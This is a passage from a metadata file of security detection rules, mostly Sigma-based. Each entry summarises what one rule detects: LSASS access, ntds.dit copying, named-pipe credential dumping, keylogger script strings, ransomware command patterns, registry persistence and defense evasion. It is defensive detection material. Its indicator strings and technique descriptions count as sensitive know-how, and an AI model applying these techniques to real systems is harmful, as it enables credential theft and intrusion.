    containing 'ntds.dit' is created in unusual directories such as Appdata, Desktop,
    Downloads, Perflogs, Temp, or Users/Public. This activity may indicate malicious
    attempts to extract the Active Directory database for unauthorized access. Legitimate
    operations like backups or creating shadow copies might trigger this rule, but
    these should be verified to rule out false positives.
  Updated-Date: '2024_09_04'
9501f8e6-8e3d-48fc-a8a6-1089dd5d7ef4:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a4369ae910a47f099ac9ca5b40425fd9
  Ruleset: sigmahq
  Summary: This rule detects network connections initiated by a process on a system
    to DevTunnels domains, which have the potential to be abused by attackers to establish
    a reverse shell or maintain persistence on a compromised machine.
  Updated-Date: '2024_09_04'
95022b85-ff2a-49fa-939a-d7b8f56eeb9b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0a581adc1aee044fb949e0be07325ae2
  Ruleset: core
  Summary: This rule detects actions indicative of the execution of the RedMimicry
    Winnti playbook, which is an automated breach emulation utility. It monitors the
    creation of specific processes, such as `rundll32.exe` or `cmd.exe`, and checks
    their command lines for references to particular malicious DLL files like `gthread-3.6.dll`
    or `sigcmm-2.4.dll`, as well as temporary batch files such as `\Windows\Temp\tmp.bat`.
    The activity identified by this rule is associated with techniques used for execution
    and defense evasion as categorized in various ATT&CK frameworks.
  Updated-Date: '2024_09_03'
951f8d29-f2f6-48a7-859f-0673ff105e6f:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0c925c30189f84b0f46dcb963b497279
  Ruleset: core
  Summary: This rule detects when an unsigned kernel module is loaded into the system,
    which is identified by EventID 3001 within Windows' Code Integrity operational
    logs. Unsigned kernel modules can indicate potential security risks as they may
    not have undergone necessary verification processes. An alert is raised to investigate
    the source and attempt to locate a signed version from the publisher to ensure
    system integrity and security.
  Updated-Date: '2024_09_03'
95214813-4c7a-4a50-921b-ee5c538e1d16:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1a52516b517c283238acb89f480b45c5
  Ruleset: emerging-threats
  Summary: This rule detects the creation of a new user profile in Windows with specific
    usernames, such as 'ANONYMOUS' and '_DomainUser_'. These usernames are associated
    with variants of the COLDSTEEL Remote Access Trojan (RAT), a type of malware used
    by attackers to gain persistent access to infected systems. The detection mechanism
    uses registry set events related to user profile creation paths, targeting specific
    registry keys and object paths linked to new user profiles.
  Updated-Date: '2024_09_03'
9525dc73-0327-438c-8c04-13c0e037e9da:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 181888b605bbc51fe30ab0f1c9185283
  Ruleset: sigmahq
  Summary: This rule detects the execution of regsvr32.exe involving DLL files located
    in potentially suspicious directories such as ProgramData, Temp, Users\Public,
    Windows\Temp, AppData\Local\Temp, and AppData\Roaming. Regsvr32 is a Windows utility
    used for registering and unregistering DLLs and ActiveX controls in the Windows
    registry, commonly exploited by attackers for bypassing application whitelisting
    defenses. The detection focuses on process creation events, analyzing both the
    executable image and the command line for indications of execution from these
    abnormal locations. Some legitimate installers may also use these directories,
    so additional filters may be required to reduce false positives.
  Updated-Date: '2024_09_04'
952ed57c-8f99-453d-aee0-53a49c22f95d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e2155d72da114374e2cc51a70e6e176a
  Ruleset: sigmahq
  Summary: This rule detects potential DLL sideloading of "AVKkid.dll," an activity
    that may indicate attempts at defense evasion or privilege escalation within a
    Windows environment. Sideloading involves loading a malicious DLL into a legitimate
    process, in this case, targeting specific paths usually associated with G DATA
    software. The detection logic identifies instances when "AVKkid.dll" is loaded,
    excluding known legitimate locations to reduce false positives. This technique
    could be used by advanced threats, such as those detailed in research on Camaro
    Dragon's USB flash drive attacks.
  Updated-Date: '2024_09_04'
95361ce5-c891-4b0a-87ca-e24607884a96:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ac140f26f152f4c685a2ab4dba79854d
  Ruleset: core
  Summary: This rule detects the use of binary padding on macOS systems, specifically
    when adversaries employ tools like `dd` and `truncate` to add junk data, altering
    the on-disk representation of malware. Binary padding can facilitate defense evasion
    by making malicious files less recognizable. The rule identifies processes where
    the `truncate` command is used with the `-s +` option or the `dd` command is executed
    with input files like `/dev/zero`, `/dev/random`, or `/dev/urandom`, indicating
    the addition of null or random padding to files.
  Updated-Date: '2024_09_03'
953945c5-22fe-4a92-9f8a-a9edc1e522da:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f28784dde9f8c4770e02a1c057469dd8
  Ruleset: core
  Summary: This rule detects the use of the "Set-Service" PowerShell cmdlet to configure
    a new Security Descriptor that enables a service to be hidden from utilities like
    "sc.exe" and "Get-Service." This technique is only applicable in PowerShell 7
    and can be used for persistence, defense evasion, and privilege escalation.
  Updated-Date: '2024_09_03'
953d460b-f810-420a-97a2-cfca4c98e602:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 49b74e2974f40caea41a14082ba65693
  Ruleset: sigmahq
  Summary: This rule detects source code enumeration through the use of GET requests,
    specifically by identifying keyword searches in URL strings associated with the
    retrieval of source code. This activity can be indicative of attempts to access
    exposed directories containing sensitive files, such as those related to Git repositories.
    The detection leverages specific keywords, like '.git/', to pinpoint such attempts
    and monitors fields including client IP, virtual host, URL, and response details.
  Updated-Date: '2024_09_04'
954f0af7-62dd-418f-b3df-a84bc2c7a774:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a3c0b67c0f9fecc22a0c8b0ec0195fe8
  Ruleset: sigmahq
  Summary: This rule detects the initiation of a new remote desktop connection using
    the "mstsc.exe" command with the "/v" flag, which specifies the remote server
    to connect to. It identifies potential lateral movement by adversaries who may
    use legitimate accounts to log into a computer via the Remote Desktop Protocol
    (RDP) and execute actions as the authenticated user. This detection focuses on
    process creation events in Windows, filtering out specific instances related to
    the Windows Subsystem for Linux to reduce false positives.
  Updated-Date: '2024_09_04'
9577edbb-851f-4243-8c91-1d5b50c1a39b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 18d15b5d7be571ecb180dd3456476259
  Ruleset: sigmahq
  Summary: This rule detects the creation or modification of Assistive Technology
    applications and the persistence mechanisms involving the 'at' component on Windows
    systems. It focuses on changes in specific registry paths related to Microsoft's
    accessibility features. The rule aims to identify unauthorized modifications linked
    to the 'atbroker.exe' binary and prevent potential misuse by filtering benign
    activities such as legitimate assistive technology installations.
  Updated-Date: '2024_09_04'
958d81aa-8566-4cea-a565-59ccd4df27b0:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a5e7bdf4d1262393f0ab350f0b12fbd7
  Ruleset: emerging-threats
  Summary: This rule detects the deactivation and disabling of the Scheduled Defragmentation
    task using the Windows task scheduler command line tool `schtasks.exe`. It specifically
    identifies commands that contain parameters such as `/delete` or `/change` along
    with `/TN` targeting the task named `\Microsoft\Windows\Defrag\ScheduledDefrag`.
    This activity has been associated with the Slingshot APT group and is relevant
    to persistence mechanisms and task scheduling manipulation in Windows environments.
  Updated-Date: '2024_09_03'
95afc12e-3cbb-40c3-9340-84a032e596a3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 12a47c1d690c937d544a41fb74b286cb
  Ruleset: sigmahq
  Summary: This rule detects adversaries attempting to hijack registry entries used
    by Windows services to execute malicious payloads. By exploiting permission weaknesses
    in the registry, attackers can redirect the executable specified for a service
    to one under their control, allowing them to run unauthorized code when the service
    starts. The local service configuration information is stored in the registry
    under HKLM\SYSTEM\CurrentControlSet\Services. Detection is based on identifying
    specific PowerShell script block text patterns, notably the use of 'get-acl' command
    directed at the mentioned registry path.
  Updated-Date: '2024_09_04'
95e60a2b-4705-444b-b7da-ba0ea81a3ee2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4074055481bcd621e44b83ec4b7b60f3
  Ruleset: sigmahq
  Summary: This rule detects the execution of Simple Help, a remote access tool, typically
    used for desktop support and remote access functions. Adversaries may leverage
    such legitimate software, including Team Viewer, Go2Assist, LogMeIn, AmmyyAdmin,
    and others, to establish an interactive command and control channel within networks.
    These tools are often permitted by application controls within a target environment.
    The rule focuses on identifying processes associated with these services, specifically
    targeting instances where this software might be misused for malicious purposes.
  Updated-Date: '2024_09_04'
95eadcb2-92e4-4ed1-9031-92547773a6db:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 55e2820d599ec9974f149afa7934d1b9
  Ruleset: sigmahq
  Summary: This rule detects suspicious PowerShell invocations originating from script
    engines such as 'wscript.exe' or 'cscript.exe'. The detection focuses on instances
    where the invoked processes are 'powershell.exe' or 'pwsh.exe'. Specific exclusions
    include processes running from the 'Health Service State' directory. This type
    of activity can indicate non-malware attacks, where attackers exploit legitimate
    tools and scripts to execute malicious actions. This can be relevant in scenarios
    like the exploitation of Excel to run PowerShell commands via DNS queries, as
    noted in various security reports.
  Updated-Date: '2024_09_04'
961d0ba2-3eea-4303-a930-2cf78bbfcc5e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4d4750816e1cf2e4aabd7fda59cc6e94
  Ruleset: core
  Summary: This rule detects the execution of well-known credential dumping tools
    by monitoring the creation of specific named pipes. Named pipes like '\cachedump',
    '\lsadump', and '\wceservicepipe' are associated with these tools, which are used
    for illicitly accessing and dumping credentials from a machine. The objective
    is to identify malicious activities aimed at credential theft, which could be
    used to gain unauthorized access within a network. While such tools may sometimes
    be employed by legitimate administrators for password recovery, their appearance
    is typically a critical indicator of potential security threats.
  Updated-Date: '2024_09_03'
961e0abb-1b1e-4c84-a453-aafe56ad0d34:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9c4a85726ec1905a93f985b7502684e1
  Ruleset: core
  Summary: This rule detects the use of the stordiag.exe utility to execute commands
    via schtasks.exe, systeminfo.exe, and fltmc.exe. Stordiag.exe is a built-in Windows
    utility, and its unusual combination with these commands may indicate malicious
    activity related to defense evasion tactics.
  Updated-Date: '2024_09_03'
961e33d1-4f86-4fcf-80ab-930a708b2f82:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 536b69acf0ce96085fb19b74539a760c
  Ruleset: core
  Summary: This rule detects the potential persistence mechanism via the creation
    of an Excel add-in (XLL) file, which is designed to run automatically when Microsoft
    Excel is started. The detection focuses on changes within the registry related
    to Microsoft Office and Excel options, specifically looking for registry entries
    that contain paths to XLL files. This method is indicative of attempts to maintain
    persistence on a Windows system by exploiting Excel's ability to load add-ins
    upon launch.
  Updated-Date: '2024_09_03'
962fe167-e48d-4fd6-9974-11e5b9a5d6d1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 594bbdde394fe4985b26735d7f8e9a16
  Ruleset: sigmahq
  Summary: This rule detects attempts to access the LSASS (Local Security Authority
    Subsystem Service) process from non-system accounts, a behavior often associated
    with credential theft tools like Mimikatz. By monitoring specific event IDs and
    access masks that indicate process interaction with LSASS, the rule identifies
    potential unauthorized access attempts. It applies filters to exclude legitimate
    access by system processes, antivirus, endpoint detection and response solutions,
    and certain known software, such as Steam's processes, to reduce false positives.
  Updated-Date: '2024_09_04'
9637e8a5-7131-4f7f-bdc7-2b05d8670c43:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cd83e31d921ebbba4742ab99eec1fb09
  Ruleset: sigmahq
  Summary: This rule detects executables in the Downloads folder on Windows systems
    that lack specific metadata fields such as FileVersion, Description, Product,
    and Company. These characteristics are often found in executables created with
    py2exe, a Python-based packaging tool. Identifying executables with these missing
    fields helps in pinpointing potentially suspicious files and abnormal behaviors
    potentially associated with malware, as legitimate executables typically contain
    these metadata fields.
  Updated-Date: '2024_09_04'
965e2db9-eddb-4cf6-a986-7a967df651e4:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 506f7da62ea7a87cc07f208191ce6629
  Ruleset: sigmahq
  Summary: This rule detects keylogger activity by identifying PowerShell scripts
    that reference keystroke capturing functions. It specifically looks for the use
    of "[Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::" within the
    script block text, which is indicative of attempts to capture keyboard input.
    This can signal malicious intent to monitor or capture user credentials or other
    sensitive information.
  Updated-Date: '2024_09_04'
965fff6c-1d7e-4e25-91fd-cdccd75f7d2c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d97b5a33b3e9b14d40e5cf0618892e4a
  Ruleset: emerging-threats
  Summary: This rule detects the presence and activity of DarkSide Ransomware and
    its associated helper processes on Windows systems. Specifically, it monitors
    for certain command line patterns that are characteristic of DarkSide behavior,
    such as code indicative of PowerShell execution and specific paths where the malware
    may temporarily store files. The rule aims to identify these malicious activities
    by scrutinizing command line inputs and parent process structures associated with
    the malware, helping to signal a potential ransomware attack.
  Updated-Date: '2024_09_03'
966315ef-c5e1-4767-ba25-fce9c8de3660:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 31e629c7f9e0c557bedc4726c04ce1c1
  Ruleset: core
  Summary: This rule detects the creation of user-specific or system-wide environment
    variables via the Windows registry that contain suspicious commands and strings.
    Specific indicators include environment variables referencing 'Powershell' or
    'pwsh', paths such as '\AppData\Local\Temp\' and 'C:\Users\Public\', certain Base64-encoded
    sequences starting with 'TV' that hint at possible obfuscation, and other suspicious
    Base64-encoded patterns like 'SW52b2tlL' and 'SQBuAHYAbwBrAGUALQ'./Base64 prefixes
    like 'SUVY' and 'aWV4' also signal potentially malicious activity.
  Updated-Date: '2024_09_03'
966e4016-627f-44f7-8341-f394905c361f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4cefa7cfe8ed040e4e1e0f7dc09120d0
  Ruleset: emerging-threats
  Summary: This rule detects potential process and execution activity related to the
    APT10 Cloud Hopper operation, specifically on Windows systems. It identifies suspicious
    activities such as the execution of 'cscript.exe' with a command line containing
    '.vbs /shell', as well as the usage of 'csvde' command to save logs in the 'C:\windows\web\'
    directory. These patterns are indicative of techniques used by APT10 in their
    cyber-espionage campaigns, known for targeting managed IT service providers and
    their clients.
  Updated-Date: '2024_09_03'
968eef52-9cff-4454-8992-1e74b9cbad6c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8a59e45248ddb18c677f1e72f2b9490b
  Ruleset: core
  Summary: This rule detects reconnaissance activity by identifying specific commands
    related to account enumeration and group membership queries on Windows systems.
    It looks for Event ID 4661 with an AccessMask value of '0x2d', targeting objects
    of type 'SAM_USER' or 'SAM_GROUP' with ObjectNames that start with 'S-1-5-21-'
    and end with '-500' or '-512'. Such activities involve the execution of commands
    like "net user administrator /domain" and "net group domain admins /domain", which
    are indicative of attempts to gather information about domain administrators and
    group memberships, potentially for malicious purposes. This rule is designed to
    flag these actions due to their high sensitivity and potential security implications.
  Updated-Date: '2024_09_03'
9691f58d-92c1-4416-8bf3-2edd753ec9cf:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9c8068fae47326fdef9852b2d1fa4ca9
  Ruleset: core
  Summary: This rule detects the execution of the "esxcli" command with the "system"
    and "permission" flags, which is used to assign admin permissions to an account
    on ESXi servers. This command is typically executed in a Linux environment and
    could be indicative of unauthorized permission changes if not part of legitimate
    administration activities.
  Updated-Date: '2024_09_03'
969c7590-8c19-4797-8c1b-23155de6e7ac:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f9af92a50a50f6fa052f8702fa9d3f3e
  Ruleset: sigmahq
  Summary: This rule detects the creation of a new identity provider in Okta. Such
    events are indicated by the specific event type 'system.idp.lifecycle.create'
    within the Okta system logs. This activity may be associated with persistence
    mechanisms or attempts to impersonate users in a cross-tenant environment. False
    positives can occur if an administrator intentionally creates a new, authorized
    identity provider.
  Updated-Date: '2024_09_04'
96b9f619-aa91-478f-bacb-c3e50f8df575:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 156daa50633dd0aa2c68a9965fa0e9e2
  Ruleset: core
  Summary: This rule detects the initiation of remote PowerShell sessions on Windows
    systems. It specifically looks for instances where certain context information
    contains 'ServerRemoteHost' and the host application is 'wsmprovhost.exe'. This
    helps identify potentially suspicious remote execution of PowerShell commands,
    which could be indicative of lateral movement or remote code execution by an attacker.
    The rule excludes cases where the context information matches known legitimate
    paths like the Windows PowerShell archive module. This enables the identification
    of potential threats while reducing false positives from normal administrative
    operations.
  Updated-Date: '2024_09_03'
96c982fe-3d08-4df4-bed2-eb14e02f21c8:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b8a7e19cb653e4863bbbd13362752270
  Ruleset: sigmahq
  Summary: This rule detects the use of the `Get-ADUser` PowerShell cmdlet for enumeration
    using the `UserAccountControl` flag, specifically targeting accounts set with
    the `DONT_REQ_PREAUTH` flag (value `4194304`). This is associated with AS-REP
    roasting, an attack where accounts not requiring pre-authentication are targeted.
    The rule looks for instances where `Get-ADUser` is used with filters on `useraccountcontrol`
    that include bitwise operations.
  Updated-Date: '2024_09_04'
96f697b0-b499-4e5d-9908-a67bec11cdb6:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cdce428d6424bc08ebdc10040ad70cca
  Ruleset: sigmahq
  Summary: This rule detects the deletion of registry entries located in ".*\shell\open\command"
    keys, which are often associated with COM hijacking activities. The removal of
    these entries could indicate an attacker's attempt to cover their tracks after
    hijacking Component Object Model (COM) objects. The rule includes several filters
    to exclude legitimate operations from common software such as svchost.exe, Microsoft
    Office, Dropbox, Wireshark, Opera, PeaZip, Everything, various uninstallers, and
    Java installers, to reduce false positives.
  Updated-Date: '2024_09_04'
970007b7-ce32-49d0-a4a4-fbef016950bd:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a0fdfb226e8cb85bbc832b9bbe8f63a7
  Ruleset: sigmahq
  Summary: This rule detects the use of "reg.exe" to query and gather reconnaissance
    information from the Windows registry. Adversaries may use this utility to extract
    details regarding system configuration, installed software, credentials, and overall
    system information. The rule identifies attempts to query specific registry keys
    commonly associated with system and service configurations.
  Updated-Date: '2024_09_04'
9703792d-fd9a-456d-a672-ff92efe4806a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2c1f1124efbc52b92e507148305d1500
  Ruleset: sigmahq
  Summary: This rule detects the deletion of a backup catalog on Windows systems by
    monitoring for EventID 524 from the Microsoft-Windows-Backup service. The occurrence
    of this event may indicate an attempt to evade defenses by eliminating backup
    records, which could be part of a defense evasion tactic.
  Updated-Date: '2024_09_04'
970823b7-273b-460a-8afc-3a6811998529:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d7693c80bdbfc527cb77c72be2dedaea
  Ruleset: core
  Summary: This rule detects the creation of scheduled tasks on Windows systems that
    are set up to execute only once at 00:00 and include suspicious command line elements.
    These elements involve actions initiated by scripts or executable files such as
    'wscript', 'vbscript', 'cscript', 'wmic', 'wmic.exe', 'regsvr32.exe', 'powershell',
    and references to the '\AppData\' directory. The context for this detection is
    relevant to activities associated with the BlackByte ransomware, which often uses
    such methods for execution, persistence, and privilege escalation.
  Updated-Date: '2024_09_03'
9711de76-5d4f-4c50-a94f-21e4e8f8384d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fab0b4199989160b5eb2d7a8442cc634
  Ruleset: sigmahq
  Summary: This rule detects the creation of 'TeamViewer_Desktop.exe' during the installation
    of TeamViewer, a remote access and control software. The detection is focused
    on file events in Windows systems where the target filename ends with '\TeamViewer_Desktop.exe'.
  Updated-Date: '2024_09_04'
9719a8aa-401c-41af-8108-ced7ec9cd75c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 16585ace493a839147c3ad971b43aa1e
  Ruleset: core
  Summary: This rule detects the removal of Windows Defender Definition Files, which
    adversaries might perform to disable security tools and avoid detection of their
    malicious activities. The detection focuses on the process creation logs, specifically
    looking for instances where the program `MpCmdRun.exe` is executed with command-line
    arguments that include the removal of definitions.
  Updated-Date: '2024_09_03'
973ef012-8f1a-4c40-93b4-7e659a5cd17f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 04c3769bbbaf892a0e934f97346a7ab6
  Ruleset: sigmahq
  Summary: This rule detects the enabling of the "EnablePeriodicBackup" registry value
    in Windows operating systems. Once enabled, the operating system will backup system
    registry hives to the "C:\Windows\System32\config\RegBack" folder upon restarts.
    A task named "RegIdleBackup" is created to manage subsequent backups. This behavior
    was the default in earlier Windows versions but was disabled starting with Windows
    10, version 1803.
  Updated-Date: '2024_09_04'
974515da-6cc5-4c95-ae65-f97f9150ec7f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8d54fd482abd35ddd756583e234a388b
  Ruleset: sigmahq
  Summary: This rule detects attempts to disable the Microsoft Defender Firewall through
    modifications in the Windows registry. It identifies changes to specific registry
    keys associated with the firewall settings in various profiles, such as Domain,
    Public, and Standard Profiles. The rule is triggered when the firewall is disabled
    by setting the corresponding registry value to "DWORD (0x00000000)". Adversaries
    may perform such actions to circumvent network restrictions and enhance their
    ability to conduct further malicious activities on the compromised system.
  Updated-Date: '2024_09_04'
975b2262-9a49-439d-92a6-0709cccdf0b2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bc9e86b06d3725472104f23bc8b86117
  Ruleset: sigmahq
  Summary: This rule detects attempts to install unsigned AppX packages using the
    "Add-AppxPackage" cmdlet or its alias "Add-AppPackage" in Windows PowerShell scripts.
    The rule specifically looks for script blocks containing the cmdlet with the flag
    "-AllowUnsigned," which indicates an attempt to bypass the standard security measures
    intended to prevent the installation of unverified software. Unsigned AppX packages
    can pose security risks as they might bypass standard application verification
    processes, making these detections crucial for identifying potential malicious
    activity or policy violations.
  Updated-Date: '2024_09_04'
97661d9d-2beb-4630-b423-68985291a8af:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 445b967d47b1534f785cd30f77dcf535
  Ruleset: core
  Summary: This rule detects process execution errors related to NodeJS, which may
    indicate a potential Remote Code Execution (RCE) vulnerability if these exceptions
    are caused by user input. By monitoring for specific keywords such as 'node:child_process',
    it seeks to identify unusual or suspicious error logs. Although certain errors,
    like those from Puppeteer invocations, might trigger similar logs without indicating
    an RCE vulnerability, the presence of these logs warrants further investigation.
  Updated-Date: '2024_09_03'
976d6e6f-a04b-4900-9713-0134a353e38b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c136989e64fdb0eb7eeb9726701e3b91
  Ruleset: core
  Summary: This rule detects the execution of a PowerShell script designed to dump
    stored credentials from Veeam Backup Servers by identifying specific script elements
    such as calls to the "Veeam.Backup" class, "[Veeam.Backup.Common.ProtectedStorage]::GetLocalString",
    and "Invoke-Sqlcmd". Veeam Backup Servers are used for data backup and replication,
    and unauthorized access to stored credentials represents a significant security
    risk.
  Updated-Date: '2024_09_03'
976dd1f2-a484-45ec-aa1d-0e87e882262b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f8be422a2d99af4b1348dd217c120bd2
  Ruleset: core
  Summary: This rule detects attempts to achieve persistence by modifying the registry
    key "HtmlHelp Author" on Windows systems. The targeted registry keys are "\Software\Microsoft\HtmlHelp
    Author\Location" and "\Software\WOW6432Node\Microsoft\HtmlHelp Author\Location".
    Modifications to these keys are indicative of an attacker's efforts to maintain
    persistence on a compromised machine, often for the purpose of executing malicious
    code or maintaining access. This detection focuses on identifying such registry
    changes, which can be highly suspicious and warrant further investigation.
  Updated-Date: '2024_09_03'
977ef627-4539-4875-adf4-ed8f780c4922:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: de529d0cfa10b54ba85a2932d93e1fc4
  Ruleset: core
  Summary: This rule detects changes in auditd configuration files on a Linux host.
    It monitors specific paths such as "/etc/audit/*", "/etc/libaudit.conf", and "/etc/audisp/*".
    Changes to these files can indicate modifications in the auditing configuration,
    which could be part of defense evasion tactics. The detection criteria include
    the type "PATH" and specified file names, capturing relevant details such as the
    executable, command, and key attributes. Potential false positives for this rule
    include legitimate administrative activities.
  Updated-Date: '2024_09_03'
97805087-93ab-4203-b5cb-287cda6aecaa:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5574fb24225e98c18ed67ec5a0b6a8ab
  Ruleset: emerging-threats
  Summary: This rule detects the initial execution of FakeUpdates/SocGholish malware,
    which is known to start via `wscript.exe` and subsequently execute commands through
    `cmd.exe`, `powershell.exe`, or `pwsh.exe`. The detection is triggered when the
    parent process is `wscript.exe` and its command line includes references to temporary
    directories, zip files, updates, and JavaScript files. It aims to identify the
    use of common web browsers like Chrome, Edge, Firefox, Opera, Brave, and Vivaldi
    in these activities. The likelihood of false positives is considered unlikely.
  Updated-Date: '2024_09_03'
97a80ec7-0e2f-4d05-9ef4-65760e634f6b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b013db5fd79641460ab896ead7905c60
  Ruleset: core
  Summary: This rule detects the execution of whoami.exe with the /priv or -priv command
    line flag, which instructs the tool to display all current user privileges. This
    activity is often associated with attempts to verify the success of privilege
    escalation exploits, as it enables an attacker or user to enumerate their security
    privileges on a Windows system.
  Updated-Date: '2024_09_03'
97aa2e88-555c-450d-85a6-229bcd87efb8:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 42e32fef4eead4c1ab336f3b19836951
  Ruleset: sigmahq
  Summary: This rule detects the creation of a screensaver binary file on Windows
    systems as an indicator of potential malicious activity. Adversaries may use screensavers
    to establish persistence by executing harmful content triggered by user inactivity.
    The rule specifically monitors for the creation of Portable Executable (PE) files
    with a `.scr` extension, excluding known legitimate processes like `Kindle.exe`,
    `ccSvcHst.exe` (Symantec Endpoint Protection), and `TiWorker.exe` associated with
    certain system activities.
  Updated-Date: '2024_09_04'
97b9ce1e-c5ab-11ea-87d0-0242ac130003:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fff2e53702671e4350a33e597684c125
  Ruleset: core
  Summary: This rule detects blocking of process creations that originate from PSExec
    and WMI commands on Windows systems. Specifically, it monitors events where process
    names end with 'wmiprvse.exe' or 'psexesvc.exe', identifying attempts to create
    processes through these utilities. This detection helps in identifying potential
    lateral movement and execution techniques within a network, often employed by
    attackers leveraging PSExec and WMI for executing commands or spreading malware.
  Updated-Date: '2024_09_03'
97dbf6e2-e436-44d8-abee-4261b24d3e41:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e03d69ea0a8a90c9815ec37cda296908
  Ruleset: core
  Summary: This rule detects the use of the aspnet_regiis command to decrypt Microsoft
    IIS connection strings. An attacker with access to the Microsoft IIS web server,
    possibly via a webshell, can use this command to decrypt and retrieve any hardcoded
    connection strings, including credentials for services such as MSSQL.
  Updated-Date: '2024_09_03'
97de11cd-4b67-4abf-9a8b-1020e670aa9e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 21a8d762c84f79649c5fb87a4aae128f
  Ruleset: sigmahq
  Summary: This rule detects command line patterns related to the use of Pnscan for
    transmitting and receiving binary data over a network. Pnscan is utilized in a
    Linux malware campaign that specifically targets Docker, Apache Hadoop, Redis,
    and Confluence environments. This malicious activity has been attributed to the
    threat actor known as TeamTNT.
  Updated-Date: '2024_09_04'
97fbabf8-8e1b-47a2-b7d5-a418d2b95e3d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cb0804b08b4ea230fbbf25e07ec59182
  Ruleset: sigmahq
  Summary: This rule detects when a user attaches a Lambda layer to an existing AWS
    Lambda function, potentially to override a library in use by the function. This
    could allow malicious code to utilize the function's IAM role for AWS API calls,
    thereby giving the attacker access to the privileges associated with the Lambda
    service role attached to that function.
  Updated-Date: '2024_09_04'
9801abb8-e297-4dbf-9fbd-57dde0e830ad:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f30ade1c0c6cdbf9b4f704cf770ec44c
  Ruleset: core
  Summary: This rule detects the execution of the IEExec utility being used to download
    and execute files, specifically by monitoring for processes where the executable
    name ends with "IEExec.exe" or has the original file name "IEExec.exe". It further
    scans the command line arguments of these executions, looking for URLs (http://
    or https://) to identify potential command and control activities associated with
    the use of IEExec.exe.
  Updated-Date: '2024_09_03'
98054878-5eab-434c-85d4-72d4e5a3361b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3cebbf3915131a9bec6f1a6ba4ee9515
  Ruleset: sigmahq
